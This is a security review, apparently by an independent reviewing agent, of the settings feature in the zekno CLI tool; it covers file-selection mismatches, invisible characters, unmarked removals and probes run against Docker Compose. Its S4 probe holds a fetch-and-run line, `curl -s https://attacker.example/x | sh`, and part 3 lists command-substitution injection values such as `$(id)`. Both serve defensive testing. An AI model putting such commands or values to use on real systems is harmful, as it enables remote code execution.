# Security Review: App Settings

Everything in [`specs/006-cli-small-features/security-review.md`](../006-cli-small-features/security-review.md),
[`specs/004-cli-app/security-review.md`](../004-cli-app/security-review.md) and
[`specs/003-cli-runner/security-review.md`](../003-cli-runner/security-review.md) still applies, except
where part 5 below says otherwise.

This is not an external audit. One independent reviewer (a separate agent that did not write the
code) read the source and ran its own probes. Nothing was fixed as part of this review. An external
audit is still required before production use.

## 1. Scope and method

**Commit.** `72041c1` on `010-app-settings`, the head when the review started: the 16 commits of
`git log dev..HEAD`. In `apps/cli/src` that is 50 files, 6,352 lines added and 99 removed.
`apps/cli/src/app/effects/deploys.ts` was changed by another builder during the review. It was read
again at `0f9a99b` ("the app's d deploys the file zekno deploy would"), the last commit that touched
it when this review ended. The working tree then held another builder's uncommitted changes to
`README.md`, `apps/cli/README.md`, `apps/cli/test/docs/docs.test.ts`, `apps/web/content/docs/cli.mdx`
and `specs/010-app-settings/tasks.md`; they were not reviewed.
`git diff dev HEAD -- packages apps/runner` is empty: the core library and the runner are unchanged
(FR-029, SC-007).

**Attackers considered**, as in the earlier reviews:

| Attacker | Can do |
|----------|--------|
| A project folder's author | Own the files of a cloned repository, or of a branch of the team's own repository: `zekno.app.json`, `compose.yaml`, folder names, links. Holds no team key. |
| Attacker B | Change files in the profile folder (`~/.zekno`). Cannot read the keychain. |
| A runner or server that lies | Answer anything. Holds no team key. |
| The hosted service to come | Nothing in this feature reaches it: settings are read, checked and turned into Compose text on the developer's machine only. |
| Typed-ahead keys | Keys pressed before a question is on the screen. A condition, not an attacker. |

**Read in full**: `settings/` (`json.ts`, `shape.ts`, `schema.ts`, `values.ts`, `words.ts`,
`file.ts`, `write.ts`, `text.ts`, `change.ts`, `source.ts`, `rows.ts`, `piped.ts`, `compose.ts`,
`types.ts`), `ops/settings.ts`, `commands/settings.ts`, `app/state/settings.ts`,
`app/state/settings-change.ts`, `app/effects/settings.ts`, `app/screens/settings.tsx`,
`settings-rows.tsx`, `settings-change.tsx`, `settings-layout.ts`, `ui/ink/settings-report.tsx`, and
`app/effects/deploys.ts` at `0f9a99b`.

**Read as diffs, with the code around them**: `project/compose-read.ts`, `project/shown.ts`,
`ops/deploy.ts`, `commands/deploy.ts`, `ops/link.ts`, `asking/asking.ts`, `asking/first-deploy.ts`,
`cli/cli.ts`, `cli/errors.ts`, `ui/plain/plain.ts`, `ui/ink/ink.tsx`, `ui/ink/lines.tsx`,
`ui/ink/deploy-live.ts`, `ui/parts/deploy-summary.tsx`, `shared/views.ts`, `shared/deploy.ts`,
`app/state/state.ts`, `app/state/reading.ts`, `app/effects/effects.ts`.

**Read because the new code leans on it**: `server/sanitize.ts`; `project/file.ts` (`findProject`,
`isHere`, `listedExactly`); `ui/parts/text-input.tsx`, `ui/parts/confirm.tsx`,
`ui/ink/questions.tsx` (`listWindow`); `app/effects/context.ts` (`trustKnown`); the runner's
`docker/compose.ts` (the environment Docker Compose interpolates from); the core's
`secrets/secrets.ts` (`SECRET_NAME`, `APP_NAME`, `isReservedSecretName`).

**Specs read**: `spec.md`; `contracts/settings-file.md`, `compose-text.md`, `deploy.md`, the
`zekno settings` part of `commands.md`; `research.md` R4 and R6; the three earlier reviews.

**Run**:

- The feature's tests. `test/settings/` (14 files) with `test/plain/plain-unchanged.test.ts`: 494
  pass. `test/ops/settings.test.ts`, `test/commands/settings.test.tsx`,
  `test/app/settings-effects.test.ts`, `settings-state.test.ts`, `settings-screen.test.tsx`,
  `test/scenarios/settings-compose.test.ts`, `settings-deploy.test.ts`,
  `test/ui/ink/settings-report.test.tsx`, `test/shared/views.test.ts`: 159 pass.
  `test/app/app-effects.test.ts` and `test/asking/first-deploy.test.ts` at `0f9a99b`: 57 pass.
- Seven throwaway probes in a scratch folder outside the repository, importing the repository's
  modules and test helpers:
  1. the Compose text of 15 hostile settings files, each run through
     `docker compose -p zekno-probe -f compose.yaml config` (Docker Compose v5.3.0 on this Mac;
     `config` only, with a minimal environment that sets `HOME` and `X`), against a control file
     that asks for `${X}`;
  2. three linked folders, with the in-memory key store, a local runner and the stand-in Docker:
     `zekno settings`, `zekno settings compose`, then `zekno deploy`, and the text signed read from
     the history (S1);
  3. the marks after a plain variable, a volume and a service were removed (S3);
  4. invisible characters in a plain value and a start command, through every surface (S2);
  5. name variants of the two files on this Mac's case-insensitive disk: letter case, a Cyrillic
     look-alike, a link to nowhere, a folder, a link out of the folder (S5);
  6. the cost of hostile files on the reader, and of the largest good files on the screen's
     layout functions;
  7. which lines of a long value the settings screen can draw (S4).
- Not used: the system keychain, `ssh`, the network, a real terminal or pseudo-terminal,
  `docker compose up` or anything that pulls or starts.

## 2. Findings

| Id | Severity | Finding | Confirmed |
|----|----------|---------|-----------|
| S1 | Medium | `zekno settings` and `zekno settings compose` show another file than `zekno deploy` deploys in the same folder, when a `zekno.json` decides | Yes, by a probe |
| S2 | Low | Invisible characters in a plain value or a start command are removed from everything shown and kept in what is signed | Yes, by a probe |
| S3 | Low | A plain variable, a volume or a service removed since the last deploy is never marked | Yes, by a probe |
| S4 | Informational | On the settings screen the middle of a long value is never drawn | Yes, with the screen's layout functions |
| S5 | Informational | The settings file is found in any letter case on a case-insensitive disk, unlike `zekno.json` | Yes, by a probe |

No finding is rated high or critical. No way was found to make the Compose text mean more than the
settings show (part 3, "The Compose text").

### S1. The settings commands show another file than the deploy uses (Medium)

**Why medium**: the command made so that a person knows "exactly what will run" prints, with status
0 and no warning, a text that `zekno deploy` in the same folder does not sign, in ordinary linked
folders; a reviewer who trusts it deploys a file they did not read, with the app's secrets.

**Where**: `apps/cli/src/ops/settings.ts:103-104` (`readHere`) always reads `<cwd>/zekno.app.json`.
It is used by `showSettings` (`:130-156`), `settingsData` (`:164-168`), `prepareSettingChange`
(`:211`) and `folderCompose` (`:273-276`). `linkInUse` (`:73-88`) looks only at a `zekno.json` in
this very folder (`isHere`, `:83`); `folderCompose` looks at none. `zekno deploy` takes the file
from the `zekno.json` that applies here or in a folder above (`cli/cli.ts:225-232`, `withProject`),
then `chooseSource` (`settings/source.ts:53-74`), where the link's file (rule 2) comes before the
file in the folder (rule 3): `ops/deploy.ts:185-190`, and `asking/first-deploy.ts` at a terminal.

**Who**: whoever can change the files of a folder that a team-signed `zekno.json` already links,
such as the author of a pull request on the team's repository (the attacker of K3 in feature 004).
No key is needed. It also happens by accident in a repository with several apps.

**Steps and result** (probe, plain output, a team-signed `zekno.json` in use here):

- **A.** `zekno.json` at the root names the root's `zekno.app.json` (image `ghcr.io/acme/root:1`).
  A sub-folder `sub` holds its own `zekno.app.json` (image `ghcr.io/acme/sub:1`). In `sub`,
  `zekno settings` prints `web	source.image	ghcr.io/acme/sub:1` and `zekno settings compose`
  prints the sub-folder's text, both with status 0 and nothing on standard error. `zekno deploy`
  there prints `Deploy 1 of demo is running on dev with no secrets.`; the history holds the signed
  text of `ghcr.io/acme/root:1`.
- **B.** `zekno.json` in the folder names `compose.yaml`, as every folder linked before this feature
  does, and a `zekno.app.json` is added. `zekno settings compose` prints the settings' text, status
  0, nothing on standard error. `zekno deploy` signs `compose.yaml`. Here `zekno settings` does say
  SH3 ("This folder's zekno.json names compose.yaml, so zekno deploy uses it, not these settings.").
- **C.** `zekno.json` names `deploy/zekno.app.json`, and the folder has its own `zekno.app.json`.
  `zekno settings` and `zekno settings compose` show the folder's own (`ghcr.io/acme/visible:1`),
  with no note. `zekno deploy` signs `deploy/zekno.app.json` (`ghcr.io/acme/hidden:1`).

In plain output the deploy names no file. At a terminal, a deploy from settings names its file in
the summary's `from` row (A and C, as `~/...` or `deploy/zekno.app.json`). A deploy from a Compose
file has no `from` row (`ui/parts/deploy-summary.tsx:86-105`), so in B nothing names
`compose.yaml`. In all three cases `zekno settings set` and `unset` write the folder's own file and
end with "Written. Run zekno deploy to use it." (`commands/settings.ts:73`, CS11), which the next
deploy does not use. FR-018 ("for an app described by a Compose file, each surface MUST say so")
does not hold for `zekno settings compose` in B.

The full-screen app is not affected: its settings screen and its `d` both take the file from the
link (`app/effects/settings.ts:100-124`; `app/effects/deploys.ts:153-224` at `0f9a99b`).

**Smallest fix**: decide the file of every `zekno settings` command by the deploy's rule. No
keychain is needed for that: `findProject(cwd)` gives the `zekno.json` that applies. When one applies
(here or above) and the file it names is not `<cwd>/zekno.app.json`, `settings compose`, `set` and
`unset` stop with a sentence that names the file `zekno deploy` would use, and `zekno settings` says
so as SH3 does. Whether that `zekno.json` is signed does not matter here: signed and in use, the
deploy uses the other file; not, the deploy stops or asks.

### S2. Invisible characters are removed from what is shown and kept in what is signed (Low)

**Why low**: a value reads as `true` or `production` everywhere zekno shows it and is another value
in the container; it needs an app that compares such a value exactly, and a code host's diff view
may flag the character.

**Where**: `settings/values.ts:67` (`NOT_ALLOWED`) refuses only `Cc`, U+2028, U+2029, U+FEFF,
U+FFFE and U+FFFF (`holdsOnlyAllowed`, `:73-75`). `server/sanitize.ts:23` and `:31` remove every
`\p{Cf}`, `\p{Zl}`, `\p{Zp}` and `Default_Ignorable_Code_Point` character when text is drawn. Only
two settings can hold such a character: the start command (`values.ts:128-179` takes any character
but its own few) and a plain value (`values.ts:269-273`). Every other setting is held to an ASCII
pattern.

**Who**: the author of a settings file, or of a change to one.

**Steps** (probe): plain `NODE_ENV` = `production` U+200B, `REQUIRE_AUTH` = `true` U+E0001 (a tag
character), `ALLOWED_HOST` = `app.` U+00AD `example.com`, `HANGUL` = `on` U+3164; start
`bun run start` U+2060.

**Result**: piped `zekno settings`, the report at a terminal (`settings/rows.ts`), the screen's rows
and its Compose text (`app/screens/settings-layout.ts:204-217`), `zekno settings compose` at a
terminal (`commands/settings.ts:146`) and the change box all show `NODE_ENV=production`,
`REQUIRE_AUTH=true`, `ALLOWED_HOST=app.example.com`, `HANGUL=on` and `bun run start`. The Compose
text that is signed keeps every character, and `docker compose config` keeps them in the
environment and in the command. A change that only adds U+200B is marked
`NODE_ENV=production  ! changed, not deployed (was NODE_ENV=production)`. Only `--json` and
`zekno settings compose` piped show the bytes.

**What an attacker gains today** (the foundation builder's question): a value that reads as the
expected one and is not. An exact comparison in the app then fails: a `NODE_ENV` that is not
`production`, a security flag read as off, a host allowlist that no longer matches. In a start
command a hidden character mostly makes a word fail. Look-alike letters (U+0578 for `u`) are drawn
as they are; no rule of the reader can tell them, and this finding does not cover them.

**Smallest fix**: yes, the reader should refuse them. Add to `NOT_ALLOWED` every character
`sanitize` removes: `\p{Cf}`, `\p{Zl}`, `\p{Zp}`, and `\p{Default_Ignorable_Code_Point}` but U+FE0E
and U+FE0F. Then, for every value the reader takes, what is drawn is what is signed, and
`zekno settings set` and the screen refuse them too, since they use the same checks. If a script
needs one (U+200C in Persian text), draw it as a visible escape instead of removing it.

### S3. A setting or a service removed since the last deploy is never marked (Low)

**Why low**: the marks exist to say what the next deploy changes, and they say nothing of a
removal, which can be a security setting; the contract states this choice.

**Where**: `settings/rows.ts:139-160` and `:163-181` make a row only for each plain variable and
volume the file has now, and `:230-244` and `:251-295` only for each service it has now. `markOf`
(`:45-62`) compares a row with the deployed value of the same name. The screen's `none` row
(`:257-272`) is marked only when no variable, or no volume, is left. contracts/commands.md: "A
setting the last deploy had and the file no longer has is not shown."

**Who**: the author of a change (a pull request), against a developer who reads the marks before
deploying.

**Steps** (probe): the last deploy had `web` with `NODE_ENV` and `REQUIRE_AUTH=1`, volumes `data`
and `audit`, and a second service `auth`. The file now has `web` with `NODE_ENV` and `data` only.

**Result**: no row of `zekno settings` or of the screen is marked, though the Compose text differs.
The next deploy drops `REQUIRE_AUTH` and the `audit` mount, and stops `auth`
(`--remove-orphans`).

**Smallest fix**: after a service's rows, one marked row for each plain variable or volume the
deployed service had and the file has not (`! removed, not deployed (was <value>)`), and one line
for each deployed service the file no longer has.

### S4. On the settings screen the middle of a long value is never drawn (Informational)

**Why informational**: the whole value is in `zekno settings`, and in the screen's Compose text
(`c`), which scrolls line by line.

**Where**: `app/screens/settings-rows.tsx:105-111` keeps the selected row's first line in the
middle of the pane (`listWindow`, `ui/ink/questions.tsx:64-81`), and `↑↓` move by row, never by
line. The change box keeps 3 lines of the old and the new value and ends them with "…"
(`settings-change.tsx:58-66`, `settings-layout.ts:28`).

**Who**: the author of a settings file, against a person who reads the settings on the screen.

**Steps** (probe with the layout functions the screen draws with, not drawn by Ink): a start
command `sh -c 'echo starting <1,500 characters>; curl -s https://attacker.example/x | sh ;<1,500
characters> && exec bun run start'`.

**Result**: at 80 by 24 the value takes 83 lines of the service pane, and 72 of them, the one with
`attacker` among them, are drawn for no row selected. At 120 by 40, 2 of 40; at 200 by 60, none.

**Smallest fix**: let `↑↓` scroll through a row taller than the pane before moving to the next row,
or draw such a row cut, with a line that points to `c`.

### S5. The settings file is found in any letter case (Informational)

**Why informational**: on one machine the file shown and the file deployed are the same file; only
two machines can differ.

**Where**: `settings/source.ts:42-50` (`present`, `lstat`) and `project/compose-read.ts:136`
(`realpathSync`) find `ZEKNO.APP.JSON` under the name `zekno.app.json` on a case-insensitive disk,
as macOS has by default. Feature 004 closed the same for `zekno.json` ("the file-name case note",
`listedExactly` in `project/file.ts:325`).

**Steps** (probe on this Mac): a folder with only `ZEKNO.APP.JSON`.

**Result**: the deploy's choice is `settings`, the file is read and turned into Compose text, and
`zekno settings` and every sentence call it `zekno.app.json`. On Linux the same folder has no
settings file. A folder with `Zekno.App.Json` and `compose.yaml` is "both" here, and asks. A
look-alike name (`zekno.аpp.json` with a Cyrillic `а`) counts nowhere, which is right.

**Smallest fix**: count a settings file only when its folder lists it exactly as `zekno.app.json`,
in `present` and before reading, as `findProject` does for `zekno.json`.

### Needs validation

- **The screen's Compose text against what `d` signs.** The screen shows the text of its last read,
  made again every 5 seconds (`app/effects/settings.ts:166-207`, `app/state/settings.ts:214-222`).
  `d` on the screen (`app/state/settings.ts:66-69`, `:156`) starts the app's deploy, which reads the
  file again (`app/effects/deploys.ts:153-224`) and signs that. A file changed in between (a
  `git checkout` in another terminal, an editor) is signed without being shown, and nothing
  compares the two. Read in the code, not run. Missing: a run in the app with the file changed
  after a read and before `d`. If it holds, the fix is to carry the screen's SHA-256 with `d` and
  refuse a file read at `d` with other bytes.
- **`zekno settings init` on a file system without hard links.** When `link` fails with `EPERM`,
  `ENOTSUP`, `EOPNOTSUPP`, `EMLINK` or `ENOSYS`, `createSettings` checks that nothing is there, then
  renames (`settings/write.ts:247-256`). A file made between the two is replaced, against "never
  over a file that is there, not even one made in between". Read in the code, not run. Missing: a
  run on exFAT or a network share, or a test whose `link` fails with `ENOTSUP`.
- **Two names that differ only in case in one Git repository** (S5). Git keeps `zekno.app.json`
  and `ZEKNO.APP.JSON` side by side; which one a macOS checkout keeps was not run.
- **`docker compose up` on a Linux server.** Only `docker compose config` was run, on macOS. Both
  use the same loader; whether `up` reads the hostile texts of part 3 the same way was not seen.
- **Combining marks.** The reader and `sanitize` both keep them (30 × U+0301 after `ok` passes;
  N3 of feature 004). Whether they draw over the rows above and below on the settings screen in
  common terminals was not looked at.

## 3. Properties checked and found to hold

**The Compose text** (`settings/compose.ts`). Probe 1 ran each of these through
`docker compose config` (v5.3.0) with `HOME` and `X` set: a plain value
`${HOME} $HOME $$ $${X} ${X:-$(id)}`; a value ending in `\`; `\"`; YAML escapes `\x41A\N\_\0`;
`a: b # c [d] {e} &f *g !h --- ...`; services named `true`, `null`, `y`, `on`, `x-evil`; a volume
named `x-data`; mount paths `/var/run/docker.sock`, `/proc/x`, `/a@b+c.-_`; a start command with
`\"`, `\\`, `$(id)` and `${HOME}` in double quotes; NBSP and U+2800 in a start command; U+FDD0 and
U+10FFFF in a value. The control file's `${X}` became `interpolated`; no settings value was
interpolated, every name and value came back as written, and nothing but `image`, `command`,
`environment`, `volumes` (long form, `type: volume`) and the project's default network appeared.

| Property | Enforced at | Test |
|----------|-------------|------|
| Every name and string value is a YAML double-quoted scalar, `\` then `"` escaped, every `$` written `$$`; no value can end its scalar, start a key, comment, tag, anchor, alias, merge key, document or interpolation | `compose.ts:36-42`, used at `:46-83`, `:99` | `test/settings/compose.test.ts`; `compose-random.test.ts` (a thousand seeded settings; `docker compose config` on the good files where Docker is installed) |
| No character a setting may hold needs another escape or breaks a line for go-yaml: `Cc` (NEL, C1 and DEL among them), U+2028, U+2029, U+FEFF, U+FFFE, U+FFFF and lone surrogates are refused | `values.ts:67-75`, applied to every string (`isImage` `:90`, `splitStart` `:131`, `checkPlainValue` `:270`) | `values.test.ts` (U+0085, U+2028 among the refused); `schema-hostile.test.ts`, "a lone surrogate, a control character or U+2028 in a name ..." |
| The text has only the keys zekno writes: no `privileged`, device, capability, `network_mode`, `pid`, `env_file`, `extends`, `include`, bind mount or relative path | `compose.ts:45-102`: fixed keys only; names held to `SERVICE_NAME` and `VOLUME_NAME` (`values.ts:39-41`) | `compose.test.ts` (each setting alone, the worked example byte for byte) |
| A volume is always a named volume, mounted at an absolute container path with no `.` or `..` part | `compose.ts:76-84`, `:97-100`; `values.ts:49`, `:283-292` | `compose.test.ts`; `values.test.ts` |
| The only interpolation is a secret, `"${NAME}"`, its name held to `SECRET_NAME`, at most 128 characters, not reserved; the runner gives Compose only the app's secrets and six names that are all reserved | `compose.ts:70-71`; `shape.ts:127-149`; `values.ts:246-252`; runner `docker/compose.ts:4-24`, `:84-90` | `schema.test.ts` (SV18, SV19); `scenarios/settings-deploy.test.ts` (both secrets reach Docker's environment, the text holds neither value) |
| A plain value cannot shadow a secret of its service | `schema.ts:282-284` (SV25) | `schema.test.ts` |
| A volume of another app cannot be named: `zekno-<app>_<volume>`, and app names hold no `_` | core `APP_NAME` (`secrets.ts:20`); `VOLUME_NAME` | No test covers this |
| The same settings give the same bytes; the deploy signs `composeText` of the file read once | `compose.ts:89-102`; `source.ts:82-93`; `ops/deploy.ts:184-203` | `compose-random.test.ts`; `scenarios/settings-compose.test.ts` and `settings-deploy.test.ts` (printed, signed and started text equal, byte for byte, in a folder with only the settings file) |
| A `zekno.json` naming `zekno.app.json`, read by a zekno before this feature as a Compose file, is refused by Docker Compose rather than run | Compose's own schema: `services.web.deploy additional properties 'cpus', 'memory', 'restart', 'start' not allowed` (probe, v5.3.0) | No test covers this |

**The reader** (`settings/file.ts`, `json.ts`, `schema.ts`, `shape.ts`):

| Property | Enforced at | Test |
|----------|-------------|------|
| One open file, `O_RDONLY | O_NOFOLLOW | O_NONBLOCK`, inside its folder by real path before and after, a regular file of this user's with one name, at most 64 KiB by `fstat` and while reading | `project/compose-read.ts:121-202`; `file.ts:117-147` | `file.test.ts`, "SR1 to SR9" (a pipe at once, a sparse file, a hard link, a link out) |
| Strict UTF-8; one byte order mark dropped, a second one refused | `file.ts:149-156`; `schema.ts:298` | `file.test.ts`, "one byte order mark is dropped; a second is not JSON"; `schema-hostile.test.ts` |
| JSON only: depth 6 checked as each object or list opens, strings of at most 4,096 code points counted while read, keys compared after escapes, objects as `Map`s, every exception a fault | `json.ts:184`, `:224`, `:122-129`, `:197-201`, `:186`, `:263-275` | `json.test.ts`, "SJ2 ... compared after escapes", "SJ3: very deep nesting stops at once"; `schema-hostile.test.ts`, "every exception is a fault, never thrown" |
| No key reaches a prototype; `__proto__`, `constructor` and `toString` are unknown keys or plain names | `shape.ts:231-232` (`Object.hasOwn`); `schema.ts:84-104` (`Map`s for named objects, `Object.fromEntries` elsewhere), `:107-146` | `json.test.ts`, "keys a prototype has ..."; `schema-hostile.test.ts`, "names a prototype has ... stay names" |
| Later settings are refused by their presence, in their own section only | `shape.ts:84-85`, `:214-228`; `schema.ts:131-135`; version `:316-322` | `schema.test.ts` (SL0 to SL5) |
| A fault names a place and a fixed rule; a name is put in only after it passed its rule | `schema.ts:152-237`; `words.ts` | `schema-hostile.test.ts`, "a value never comes back into a sentence ..."; the sentinel in every faulty file (`test/support/settings-files.ts`) across `settings-deploy.test.ts` and `commands/settings.test.tsx` |
| A hostile file costs little: measured here, the worst built (16,000 bad secret names, every value of every service wrong, 60 KiB numbers, quote and image patterns made to backtrack) took at most 30 ms | the bounds above; anchored patterns with no nested repeats (`values.ts:39-58`) | `json.test.ts`, "a file of 64 KiB of keys ... reads quickly" |

**Which file a deploy uses** (`settings/source.ts`):

| Property | Enforced at | Test |
|----------|-------------|------|
| `-f`, then the link's file, then the one file here; both here and nothing above: a question at a terminal, DP2 and status 2 without one; never a silent pick | `source.ts:53-74`; `ops/deploy.ts:185-190`; `asking/first-deploy.ts` (`whichFile`) | `source.test.ts`, "chooseSource: the first rule that applies decides"; `settings-deploy.test.ts` |
| A name is there without following a link: a link to nowhere, a link out and a folder of that name all count, so neither file can vanish and let the other win | `source.ts:42-50` | `source.test.ts`, "a link is not followed to decide whether a file is there ..."; probe 5 |
| The app's `d` follows the same rule; with both and no link it deploys nothing (DP5) | `app/effects/deploys.ts:153-224` at `0f9a99b` | `app-effects.test.ts` at `0f9a99b` |
| `zekno link` names `zekno.app.json` only when it is the one file here; with both, DP2 before any question | `ops/link.ts` (`fileHere`); `cli/cli.ts` (`linkDetails`) | `settings-deploy.test.ts` |
| The rules of a `zekno.json` not signed by the team, or not yet used here, are unchanged (FR-013) | `withProject` unchanged; `chooseSource` takes the link only when given one | the feature 004 tests, unchanged and passing in `first-deploy.test.ts` |

**The writer** (`settings/write.ts`):

| Property | Enforced at | Test |
|----------|-------------|------|
| A change is written whole or not at all: a new file beside it under a random name (`wx`, 0600), the old mode set with `fchmod`, written, flushed, renamed over; the temporary file removed on failure | `write.ts:106-124`, `:187-208` | `write.test.ts`, "replaces the file ... and keeps its mode", "the file is flushed ...", "a failure after the new file was made leaves no temporary file" |
| Never over a file that changed, a link, another file, a second name or another user's file: `lstat`, then a reopen with `O_NOFOLLOW`, device, inode and SHA-256 compared, right before the rename | `write.ts:133-179` | `write.test.ts`, the CS12, CS13 and hard-link tests |
| The text written reads back to the same settings | `write.ts:85-95`; `change.ts:295-307` | `write.test.ts`, "a text the reader does not read back stops before anything is written" |
| `zekno.app.json` that is a link is never written through, even to a file inside the folder | `ops/settings.ts:178-186`, `:222`, `:232`; `app/effects/settings.ts:237-238` | `commands/settings.test.tsx`, "CS13 ..."; `settings-effects.test.ts`, "a file now a symbolic link is not written through" |
| `init` never replaces a file, a link or one made since the check (on a disk with hard links) | `ops/settings.ts:241-244`; `write.ts:247-251` | `write.test.ts`, "IN4: nor a link, nor a file that appears between the check and the link" |
| The race between the last check and the rename costs another program's write of those few calls, nothing more: a link put at the name is replaced, not followed; a folder swapped on the way makes the rename fail | `write.ts:197-199` | `write.test.ts`, "a change made between the check and the rename is the known limit" |

**Questions, terminals and secrets**:

| Property | Enforced at | Test |
|----------|-------------|------|
| With no terminal, `set` and `unset` write only with `--yes`, and `init` never | `commands/settings.ts:71`, `:114`; `ui/plain/plain.ts:85-87` | `commands/settings.test.tsx`, "piped: with --yes ...; without, ... nothing written"; "IN4 before any question ...; with no terminal, IN5" |
| At a terminal a key typed before the question never answers it | `Ui.confirm` and `Ui.choose` unchanged (feature 004, K12) | `test/ui/ink/questions.test.tsx` (feature 006) |
| On the screen only `y` writes; `n`, Enter and Esc do not; a paste holding a line break is not taken, so a paste cannot both submit a value and answer | `settings-change.ts:191-207`; `ui/parts/text-input.tsx:44-51` | `settings-state.test.ts`, "asking: y asks to write ...; n, enter and esc write nothing", "a paste of one line is taken, of several not" |
| A write from the screen is refused when the file is not the bytes the change was opened on | `settings-change.ts:97`, `:206`; `app/effects/settings.ts:239-240`; then `write.ts:133-179` | `settings-state.test.ts`, "the SHA-256 written against is the one the change was opened on ..."; `settings-effects.test.ts`, "the file edited elsewhere while a change is being confirmed" |
| Opening the screen, its ticks and a write read no keychain; the history is read with the team list verified at start | `app/effects/settings.ts:128-207` (`trustKnown`, `lastDeployedCompose`); `app/effects/context.ts:130` | `settings-effects.test.ts` (`touched` stays `{ keychain: 0, servers: 0 }`) |
| `set`, `unset`, `init` and `compose` never open the team or connect | `ops/settings.ts:199-276` | `commands/settings.test.tsx`, "in a linked folder with a team, set and unset never read the keychain and never connect" |
| Everything drawn from the file is cleaned or held to an ASCII pattern: rows, marks, the Compose text at a terminal and on the screen, the value filled in a change, file paths, notices | `rows.ts:61`, `:78`; `change.ts:157`; `settings-layout.ts:207`; `settings-change.tsx:126`; `settings-report.tsx`; `piped.ts:51-56`; `commands/settings.ts:146`; `project/shown.ts` | `settings-screen.test.tsx`; `settings-report.test.tsx`; `commands/settings.test.tsx` (S2 is about what cleaning removes, not about escape sequences) |
| No secret value is in the file, a line, a screen, an error or `--json`: the file holds names only, and the history comparison reads Compose text, which holds `${NAME}` | `shape.ts:127-149`; `shared/views.ts:338-346` | `commands/settings.test.tsx`, "no secret value appears in any output ... (SC-004)"; `settings-effects.test.ts`, "no secret value reaches what the screen is given" |
| A reserved secret name is refused in `secrets` (SV19), by the runner's own rule; reserved names stay allowed as plain names, which only reach the container | `values.ts:246-252`; `shape.ts:129-136` | `schema.test.ts`; `values.test.ts` |
| Plain output and `--json` cannot be split into false columns: no value or name holds a tab or a line break | `values.ts:67` | `commands/settings.test.tsx` (piped lines) |
| The screen stays usable with the largest good files: measured here, at most 12 ms per frame for its rows and Compose lines (128 plain values of about 490 characters; a Compose text of 179,232 bytes from 32 services of 256 secrets) | `settings-layout.ts` | No test covers the cost |
| With no terminal, every command that existed before behaves as before in a folder with no settings file | `chooseSource` gives `compose` there; `present` changes nothing when the name is absent | `plain/plain-unchanged.test.ts` (only the help gained five lines) |

**Noted, not a finding.** In a folder that is not linked, the settings screen of whichever app is
selected (`<server> › <app> › settings`) shows this folder's `zekno.app.json`, marked against that
app's last deploy, and `d` then deploys it to that app after "Remember this folder?". That is
research R6 and the rule `d` has had since feature 004 for `compose.yaml`; the screen now adds the
app's name over a file that may never have been that app's.

## 4. Tests that are missing

For properties that hold:

- `docker compose config` with an environment that sets each name a value mentions after `$`, so
  that interpolation would show; and a check that Compose's output has no service key but those
  zekno writes. The existing Docker test compares names and values in its own environment.
- Service and volume names that start with `x-`, through Docker Compose. Version 5.3.0 keeps them
  as a service and a volume; a Compose that read them as extensions would drop a service the
  settings show.
- A volume of one app cannot name another app's volume (`zekno-<app>_<volume>`).
- A settings file read as a Compose file (a `zekno.json` naming `zekno.app.json`, deployed by a zekno
  before this feature) is refused by Docker Compose.
- The cost of the largest good file on the screen's rows and Compose lines, per frame.
- `settings-effects.test.ts`, "both files and no link: the settings, as d would ask before deploying
  them": since `0f9a99b`, `d` does not ask there, it says DP5. The test's name, not its check, is
  out of date.

For the findings, once fixed: the three folders of S1, for `settings`, `settings compose`, `set` and
`unset`; each character class of S2 in a plain value and a start command, refused with SV24 and SV9;
a removed plain variable, volume and service marked (S3); a row taller than the pane, seen whole on
the screen (S4); `ZEKNO.APP.JSON` alone, not a settings file (S5).

## 5. Carried over from earlier reviews

**Feature 003**

- C1, trust rebuilt from the signed lists: still true. `zekno settings` opens the team with
  `teamOf`; the screen uses the team list verified when the app opened.
- C3, a deploy read from under its signature, never from the unsigned history: still true. The
  marks read the last deploy's Compose text through `verifiedDeploys` (`shared/views.ts:338-346`).
  Which deploy counts as the last still rests on the unsigned `outcome` mark; attacker B can change
  the marks, nothing else.
- C4, deploy numbers: unchanged. A deploy from settings goes on from `prepareDeploy` as before.
- C5, the hidden prompt: unchanged.
- C6, names from the runner: unchanged.
- Hardening, words after a command: still true. `settings set` takes at most four words, `unset`
  three, `compose` and `init` two (`cli/cli.ts`, `WORDS`, checked at `:185`).
- Hardening, reserved names: still true. SV19 uses `isReservedSecretName`, the runner's rule.
- "A signed Compose file can read the runner's key through a bind mount or a relative path": a
  Compose text made from settings can do neither. It holds named volumes only, and no path of the
  server.

**Feature 004**

- C8, C9, C10, text cleaned before it is drawn: still true for every new surface. C10 removes
  invisible characters when drawing; S2 is what that leaves for a value that is signed.
- P1, a `zekno.json` not signed by the team is never used: still true. `zekno settings` never uses,
  asks about or records one.
- P2, a `zekno.json` above gives its file only to its own app: still true for the deploy. S1 is the
  settings commands not following it.
- P5, aliases counted before YAML is parsed: still true. `deployedSettings` bounds the text and
  counts aliases first (`compose.ts:184-186`).
- P6 and P7, one reader that keeps a file inside its folder: still true. The settings file is read
  by the same `readInsideBytes`, with a 64 KiB limit.
- The file-name case note (only a file listed exactly as `zekno.json` counts): not applied to
  `zekno.app.json` (S5).
- K1, K2, K4, the questions about a teammate's signed `zekno.json`: unchanged. A link may now name
  `zekno.app.json`; the question shows it as it shows a Compose file.
- K3 and N5, the signature vouches for names, not for the content beside them: unchanged, and true
  of `zekno.app.json`. The tool for reading a branch, `zekno settings compose`, is the one S1 is
  about.
- K8, a link's path stays inside its folder: unchanged.
- K10, one keychain read per command: still true. `zekno settings` reads it once, and only when
  this folder has its own `zekno.json` and a profile exists.
- K12, typed-ahead keys: still true for DP1 and CS9 at a terminal. On the screen only `y` writes.
- L7 and L8, reads in the background: the settings screen's tick asks for the same refresh the app
  screen does, through the kept session. Nothing new connects.
- N1, a token taken as a secret's name: now also reachable as `zekno settings set web.secrets
  sk_live_...`, which fits `SECRET_NAME` and is written into `zekno.app.json`, a file meant to be
  committed. The same holds for a secret value given by mistake as a plain value
  (`web.plain.API_KEY`): it is shown before the question, but nothing says the file is meant for a
  repository, and the value stays in the shell's history. No rule can tell such a value.

**Feature 006**

- With no terminal, every existing command takes its old path: still true
  (`plain-unchanged.test.ts`, help lines only).
- A key typed before a question never answers it: still true for DP1 (`Ui.choose`) and CS9
  (`Ui.confirm`).
- S1 to S4 of that review: not touched by this feature.

**Not checked by this review**: a real terminal or pseudo-terminal; real SSH; `docker compose up`;
Linux; macOS Keychain prompts; the full-screen app drawn by Ink beyond its layout functions and the
existing tests.
